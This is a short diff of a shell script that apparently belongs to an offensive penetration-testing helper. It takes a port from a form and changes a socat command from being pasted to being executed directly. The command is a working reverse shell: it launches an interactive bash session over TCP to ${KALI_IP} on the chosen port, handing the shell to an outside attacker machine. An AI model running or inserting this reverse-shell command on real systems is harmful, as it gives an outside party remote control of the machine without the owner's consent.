@@ -8,4 +8,4 @@ generate_form "${PORT_FIELD}"
 
 PORT=${form_data["port"]}
 
-paste_command "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KALI_IP}:${PORT}"
+execute_command "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KALI_IP}:${PORT}"
